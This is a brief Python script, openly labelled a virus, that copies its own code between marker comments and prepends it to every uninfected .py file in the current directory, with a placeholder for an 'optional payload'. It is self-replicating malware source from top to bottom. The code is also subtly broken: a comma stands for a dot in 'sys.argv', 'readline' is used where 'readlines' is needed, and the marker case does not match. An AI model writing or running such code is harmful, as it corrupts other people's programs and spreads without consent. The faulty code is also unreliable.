#!/usr/bin/env python


#### Virus BEGIN ####
import sys, glob, re

# Get copy of the virus
vCode =[]
fh = open(sys,argv[0], "r")
lines = fh.readline()
fh.close()
inVirus = False
for line in lines:
    if (re.search('^#### Virus BEGIN ####', line)): inVirus = True
    if (inVirus): vCode.append(line)
    if (re.search('^#### Virus END ####', line)): break


# Find potential Victims
progs = glob.glob("*.py")



# Check and Infect
for prog in progs:
    fh = open(prog, "r")
    pCode = fh.readlines()
    fh.close()
    infected = False
    for line in pCode:
        if ('#### VIRUS BEGIN ####' in line):
            infected = True
            break
    if not infected:
        newCode = []
        if ('#!' in pCode[0]): newCode.append(pCode.pop(0))
        newCode.extend(vCode)
        newCode.extend(pCode)
        # Writing new virus infected code
        fh = open(prog, "w")
        fh.writelines(newCode)
        fh.close()


# Optional Payload

print("Infected!")

#### VIRUS END ####